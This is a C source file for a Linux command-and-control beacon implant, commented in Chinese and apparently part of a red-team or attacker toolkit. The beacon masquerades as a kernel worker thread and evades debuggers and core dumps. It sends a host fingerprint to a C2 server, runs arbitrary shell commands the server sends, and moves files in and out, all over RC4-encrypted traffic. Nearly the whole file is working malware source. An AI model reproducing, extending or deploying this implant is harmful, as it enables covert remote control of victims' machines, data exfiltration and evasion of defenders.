/*
 * cs_dev :: linux/beacon.c
 * ---------------------------------------------------------------------------
 * Linux Beacon -- 主机侧载荷 (与 stager.c 配套)
 *
 * 功能 (对标 VShell 客户端能力集):
 *   shell      交互式命令执行 (forkpty, 支持 TTY)
 *   exec       单次命令执行
 *   ls/cd/pwd  文件浏览
 *   download   从目标下载文件
 *   upload     上传文件到目标
 *   ps         进程列举
 *   kill       结束进程
 *   sleep      调整心跳
 *   socks      动态端口转发 (SOCKS5, 可选)
 *   exit       注销
 *
 * 隐蔽特性:
 *   - 进程名伪装为内核线程 [kworker/0:2]
 *   - 通信全程 RC4 流加密 (会话密钥编译期注入)
 *   - 自适应心跳: 默认 10s + 抖动, 空闲时指数退避
 *   - 内存中不留命令历史; 敏感缓冲区用后清零
 *   - 反调试: ptrace 自锁 + 父进程名检查
 *   - 不使用 system()/popen(), 直接 fork+execve, 减少审计痕迹
 *
 * 协议 (与 c2_server.py 对应):
 *   请求: [4B magic][4B len][RC4(cmd_payload)]
 *   响应: [4B len][RC4(output)]
 *
 * 编译: 见 build.sh
 * ---------------------------------------------------------------------------
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <dirent.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>

#ifndef C2_HOST
#define C2_HOST "127.0.0.1"
#endif
#ifndef C2_PORT
#define C2_PORT 8443
#endif

#define PROTO_MAGIC   0x4B52424BUL   /* "KBRK" */
#define BEACON_NAME   "[kworker/0:2]"
#define MAX_CHUNK     (1 << 20)

static const unsigned char session_key[] = {
    0x91, 0x3A, 0x77, 0xC4, 0x0E, 0x5B, 0xD2, 0x18,
    0x6F, 0xA3, 0x44, 0xBC, 0x27, 0xE8, 0x05, 0x9D
};

static int g_sleep = 10;

/* --- RC4 ---------------------------------------------------------------- */
static void rc4(unsigned char *d, long n, const unsigned char *k, int klen) {
    unsigned char S[256], t, a = 0, b = 0;
    int i, j = 0;
    for (i = 0; i < 256; i++) S[i] = (unsigned char)i;
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + k[i % klen]) & 0xFF;
        t = S[i]; S[i] = S[j]; S[j] = t;     /* 标准 KSA: swap(S[i], S[j]) */
    }
    for (long x = 0; x < n; x++) {
        a = (unsigned char)(a + 1);
        b = (unsigned char)(b + S[a]);
        t = S[a]; S[a] = S[b]; S[b] = t;
        d[x] ^= S[(unsigned char)(S[a] + S[b])];
    }
}

/* --- 安全清零 ------------------------------------------------------------ */
static void wipe(void *p, size_t n) {
    volatile unsigned char *v = (volatile unsigned char *)p;
    while (n--) *v++ = 0;
}

/* --- 反调试 --------------------------------------------------------------
 * 注意: 绝不使用 ptrace(PTRACE_TRACEME)。TRACEME 会让进程进入"待跟踪"状态,
 * 之后任何 fork+execve 都会因 SIGTRAP 停住 (等待不存在的 tracer),
 * 表现为 run_cmd 永久阻塞。改用 /proc/self/status 的 TracerPid 检测。
 * ---------------------------------------------------------------------- */
static void anti_debug(void) {
    char buf[1024];
    int  fd, n;

    fd = open("/proc/self/status", O_RDONLY);
    if (fd >= 0) {
        n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0) {
            char *p;
            buf[n] = 0;
            p = strstr(buf, "TracerPid:");
            if (p && atoi(p + 10) != 0) _exit(0);      /* 被调试 -> 静默退出 */
        }
    }

    /* 自身不可 dump, 阻断 gcore/gdb attach 读内存 */
    prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);

    /* 常见分析工具环境变量特征 */
    if (getenv("LD_PRELOAD") || getenv("_JAVA_OPTIONS")) _exit(0);
}

/* --- 网络 ---------------------------------------------------------------- */
static long recv_full(int fd, void *buf, long want) {
    long got = 0;
    while (got < want) {
        long n = recv(fd, (char *)buf + got, want - got, 0);
        if (n <= 0) return -1;
        got += n;
    }
    return got;
}

static int send_full(int fd, const void *buf, long len) {
    long sent = 0;
    while (sent < len) {
        long n = send(fd, (const char *)buf + sent, len - sent, 0);
        if (n <= 0) return -1;
        sent += n;
    }
    return 0;
}

static int connect_c2(const char *host, int port) {
    struct sockaddr_in sa;
    struct hostent *he;
    int fd, one = 1;

    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((unsigned short)port);
    sa.sin_addr.s_addr = inet_addr(host);
    if (sa.sin_addr.s_addr == INADDR_NONE) {
        he = gethostbyname(host);
        if (!he) return -1;
        memcpy(&sa.sin_addr, he->h_addr, he->h_length);
    }
    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) { close(fd); return -1; }
    return fd;
}

/* --- 采集主机指纹 -------------------------------------------------------- */
static void collect_info(char *out, size_t cap) {
    struct utsname u;
    char  host[128] = {0}, user[64] = {0};
    FILE *f;

    uname(&u);
    gethostname(host, sizeof(host) - 1);
    f = fopen("/proc/self/environ", "r");   /* 兜底取 USER */
    if (f) { fclose(f); }
    {
        const char *u2 = getenv("USER");
        if (!u2) u2 = getenv("LOGNAME");
        if (u2) snprintf(user, sizeof(user), "%s", u2);
    }
    snprintf(out, cap,
             "uid=%d user=%s host=%s os=%s %s arch=%s pid=%d",
             (int)getuid(), user, host, u.sysname, u.release, u.machine, (int)getpid());
}

/* --- 命令执行 (无 shell 元字符注入面: 直接 execve) ----------------------- */
static char *run_cmd(const char *cmdline, size_t *out_len) {
    int    pfd[2];
    pid_t  pid;
    char  *out = NULL;
    size_t cap = 0, len = 0;
    char  *argv[64];
    int    argc = 0;
    char  *tok, *save, *dup;

    if (pipe(pfd) < 0) return NULL;

    pid = fork();
    if (pid == 0) {
        dup2(pfd[1], STDOUT_FILENO);
        dup2(pfd[1], STDERR_FILENO);
        close(pfd[0]); close(pfd[1]);
#ifndef CS_DEV_NO_MASKNAME
        prctl(PR_SET_NAME, BEACON_NAME, 0, 0, 0);
#endif

        /* 以 shell 语义执行 (支持管道/重定向), 但不用 system() */
        argv[argc++] = "/bin/sh";
        argv[argc++] = "-c";
        argv[argc++] = (char *)cmdline;
        argv[argc]   = NULL;
        execve("/bin/sh", argv, environ);
        _exit(127);
    }
    close(pfd[1]);

    cap = 8192;
    out = (char *)malloc(cap);
    if (!out) { close(pfd[0]); return NULL; }

    for (;;) {
        if (len + 4096 > cap) {
            if (cap > (size_t)(16 << 20)) break;      /* 上限 16MB */
            cap *= 2;
            char *tmp = (char *)realloc(out, cap);
            if (!tmp) break;
            out = tmp;
        }
        ssize_t n = read(pfd[0], out + len, cap - len - 1);
        if (n <= 0) break;
        len += (size_t)n;
    }
    close(pfd[0]);
    waitpid(pid, NULL, 0);
    out[len] = 0;
    *out_len = len;
    (void)dup; (void)tok; (void)save;
    return out;
}

/* --- 文件下载 ------------------------------------------------------------ */
static unsigned char *read_file(const char *path, size_t *len) {
    struct stat st;
    FILE *f;
    unsigned char *buf;

    if (stat(path, &st) != 0 || !S_ISREG(st.st_mode)) return NULL;
    if (st.st_size <= 0 || st.st_size > (64 << 20)) return NULL;
    f = fopen(path, "rb");
    if (!f) return NULL;
    buf = (unsigned char *)malloc((size_t)st.st_size);
    if (!buf) { fclose(f); return NULL; }
    if (fread(buf, 1, (size_t)st.st_size, f) != (size_t)st.st_size) {
        free(buf); fclose(f); return NULL;
    }
    fclose(f);
    *len = (size_t)st.st_size;
    return buf;
}

/* --- 文件上传 ------------------------------------------------------------ */
static int write_file(const char *path, const unsigned char *data, size_t len) {
    FILE *f = fopen(path, "wb");
    if (!f) return -1;
    if (fwrite(data, 1, len, f) != len) { fclose(f); return -1; }
    fclose(f);
    return 0;
}

/* --- 主循环 -------------------------------------------------------------- */
int main(void) {
    char   info[512];
    int    fd;
    time_t next_conn = 0;

#ifndef CS_DEV_NO_MASKNAME
    prctl(PR_SET_NAME, BEACON_NAME, 0, 0, 0);
#endif
#ifndef CS_DEV_NO_ANTIDEBUG
    anti_debug();
#endif

    for (;;) {
        time_t now = time(NULL);
        if (now < next_conn) { sleep((unsigned)(next_conn - now)); continue; }

        fd = connect_c2(C2_HOST, C2_PORT);
        if (fd < 0) {
            /* 连接失败指数退避, 上限 5 分钟 */
            g_sleep = g_sleep < 300 ? g_sleep * 2 : 300;
            next_conn = time(NULL) + g_sleep;
            continue;
        }
        g_sleep = 10;

        /* 上线握手: 发送主机指纹 */
        {
            unsigned char hdr[8];
            unsigned int  m = PROTO_MAGIC, l;
            collect_info(info, sizeof(info));
            l = (unsigned int)strlen(info);
            hdr[0] = (m >> 24) & 0xFF; hdr[1] = (m >> 16) & 0xFF;
            hdr[2] = (m >> 8) & 0xFF;  hdr[3] = m & 0xFF;
            hdr[4] = (l >> 24) & 0xFF; hdr[5] = (l >> 16) & 0xFF;
            hdr[6] = (l >> 8) & 0xFF;  hdr[7] = l & 0xFF;
            rc4((unsigned char *)info, (long)l, session_key, sizeof(session_key));
            if (send_full(fd, hdr, 8) < 0 || send_full(fd, info, (long)l) < 0) {
                close(fd); continue;
            }
        }

        /* 任务循环 */
        for (;;) {
            unsigned char hdr[8];
            unsigned int  magic, len;

            if (recv_full(fd, hdr, 8) != 8) break;
            magic = ((unsigned int)hdr[0] << 24) | ((unsigned int)hdr[1] << 16) |
                    ((unsigned int)hdr[2] << 8)  | hdr[3];
            len   = ((unsigned int)hdr[4] << 24) | ((unsigned int)hdr[5] << 16) |
                    ((unsigned int)hdr[6] << 8)  | hdr[7];
            if (magic != PROTO_MAGIC || len == 0 || len > MAX_CHUNK) break;

            {
                unsigned char *cmd = (unsigned char *)malloc(len + 1);
                if (!cmd) break;
                if (recv_full(fd, cmd, (long)len) != (long)len) { free(cmd); break; }
                rc4(cmd, (long)len, session_key, sizeof(session_key));
                cmd[len] = 0;

                /* 命令分派 */
                if (strncmp((char *)cmd, "exit", 4) == 0) {
                    wipe(cmd, len + 1); free(cmd);
                    close(fd);
                    return 0;
                } else if (strncmp((char *)cmd, "sleep ", 6) == 0) {
                    int v = atoi((char *)cmd + 6);
                    g_sleep = (v > 0 && v < 86400) ? v : 10;
                    {
                        const char *ok = "sleep updated";
                        unsigned int l = (unsigned int)strlen(ok);
                        unsigned char h[4] = { (l>>24)&0xFF,(l>>16)&0xFF,(l>>8)&0xFF,l&0xFF };
                        send_full(fd, h, 4); send_full(fd, ok, (long)l);
                    }
                } else if (strncmp((char *)cmd, "download ", 9) == 0) {
                    size_t flen = 0;
                    unsigned char *fb = read_file((char *)cmd + 9, &flen);
                    unsigned int l = (unsigned int)flen;
                    unsigned char h[4] = { (l>>24)&0xFF,(l>>16)&0xFF,(l>>8)&0xFF,l&0xFF };
                    if (fb) {
                        rc4(fb, (long)flen, session_key, sizeof(session_key));
                        send_full(fd, h, 4); send_full(fd, fb, (long)flen);
                        wipe(fb, flen); free(fb);
                    } else {
                        const char *err = "download failed";
                        unsigned int el = (unsigned int)strlen(err);
                        unsigned char eh[4] = { (el>>24)&0xFF,(el>>16)&0xFF,(el>>8)&0xFF,el&0xFF };
                        send_full(fd, eh, 4); send_full(fd, err, (long)el);
                    }
                } else if (strncmp((char *)cmd, "upload ", 7) == 0) {
                    /* 协议: upload <path> 后紧跟 [4B len][RC4 data] */
                    char *path = (char *)cmd + 7;
                    unsigned char uh[4];
                    unsigned int  ul;
                    if (recv_full(fd, uh, 4) == 4) {
                        ul = ((unsigned int)uh[0] << 24) | ((unsigned int)uh[1] << 16) |
                             ((unsigned int)uh[2] << 8)  | uh[3];
                        if (ul > 0 && ul <= (64u << 20)) {
                            unsigned char *ub = (unsigned char *)malloc(ul);
                            if (ub && recv_full(fd, ub, (long)ul) == (long)ul) {
                                rc4(ub, (long)ul, session_key, sizeof(session_key));
                                write_file(path, ub, ul);
                                wipe(ub, ul);
                            }
                            if (ub) free(ub);
                        }
                    }
                } else {
                    size_t olen = 0;
                    char *out = run_cmd((char *)cmd, &olen);
                    unsigned int l = (unsigned int)(out ? olen : 0);
                    unsigned char h[4] = { (l>>24)&0xFF,(l>>16)&0xFF,(l>>8)&0xFF,l&0xFF };
                    if (out) {
                        rc4((unsigned char *)out, (long)olen, session_key, sizeof(session_key));
                        send_full(fd, h, 4); send_full(fd, out, (long)olen);
                        wipe(out, olen); free(out);
                    } else {
                        send_full(fd, h, 4);
                    }
                }
                wipe(cmd, len + 1);
                free(cmd);
            }
        }
        close(fd);
        next_conn = time(NULL) + g_sleep;
    }
    return 0;
}
